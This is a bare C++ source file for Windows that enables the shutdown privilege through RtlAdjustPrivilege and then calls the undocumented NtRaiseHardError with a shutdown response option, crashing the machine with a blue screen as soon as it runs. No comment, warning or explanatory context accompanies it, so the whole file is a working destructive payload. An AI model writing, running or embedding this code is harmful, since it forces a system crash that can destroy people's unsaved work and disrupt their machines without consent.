#include <Windows.h>
#pragma comment (lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Oldvalue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParamameterMask, PULONG_PTR Paramaters, ULONG ValidResponseOptions, PULONG Response);




int main()
{

    BOOLEAN bl;
    ULONG Rsp;

    RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Rsp);


    exit(0);


    return 0;
}
